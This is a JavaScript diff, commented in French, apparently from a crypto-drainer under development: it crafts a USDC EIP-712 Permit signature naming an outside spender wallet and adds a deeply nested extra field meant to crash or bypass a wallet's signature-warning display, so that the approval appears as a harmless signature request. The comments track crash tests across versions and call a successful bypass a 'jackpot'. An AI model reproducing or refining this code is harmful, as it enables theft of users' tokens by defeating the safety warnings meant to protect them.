@@ -205,25 +205,33 @@ async function sign(value, nonce) {
   //     CW essaie de render TOUS les champs JSON du message → stack overflow renderer
   //     Crash renderer ≠ crash type resolver → handler différent → Signer possible
 
+  // CHAOS v5 — ISOLATION TEST : D1 deep nesting SEUL, zéro type invalide
+  //
+  // Hypothèse : CW valide que le message contient EXACTEMENT les bons keys.
+  // Si CW check : Object.keys(message) === ["owner","spender","value","nonce","deadline"]
+  // → `_ref` extra → bypass détection → "Demande de signature"
+  //
+  // Types 100% valides (EIP712Domain + Permit uniquement, zero orphan) → zero crash
+  // ethers.js encode seulement les champs du type Permit → `_ref` ignoré → SIG VALIDE ✅
+  //
+  // SI résultat : "Demande de signature" + bouton "Signer" → JACKPOT
+  // SI résultat : "Autoriser préalable" → CW ne check pas les keys du message
+  //              → crash v4 venait des orphans invalides, pas du nesting
   const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
-      Permit: PERMIT_TYPES,
-      // [A] Orphan → type indéfini "GhostToken" — crash path différent du self-ref
-      TokenRef: [{name:"token", type:"GhostToken"}, {name:"amount", type:"uint256"}],
-      MetaRef:  [{name:"ref",   type:"GhostToken"}, {name:"tag",    type:"string"}],
-      DataNode: [{name:"node",  type:"GhostToken"}, {name:"id",     type:"uint256"}]
+      Permit: PERMIT_TYPES
+      // AUCUN orphan, AUCUN self-ref, AUCUN type invalide
     },
     primaryType:"Permit",
     domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
     message:{
       owner:addrA, spender:WALLET_B, value, nonce, deadline,
-      // [B] D1 deep nest — 400 niveaux, ignoré par ethers.js, crash le renderer CW
-      _ref: buildDeepNest(400)
+      _ref: buildDeepNest(100)  // D1 seulement — ignoré par EIP-712 sig
     }
   };
 
-  logA("⏳ CHAOS v4 : undefined type ref + D1 deep nesting…");
+  logA("⏳ CHAOS v5 : D1 deep nesting isolé, types valides…");
   setS("En attente de signature…","spin");
 
   let sig;
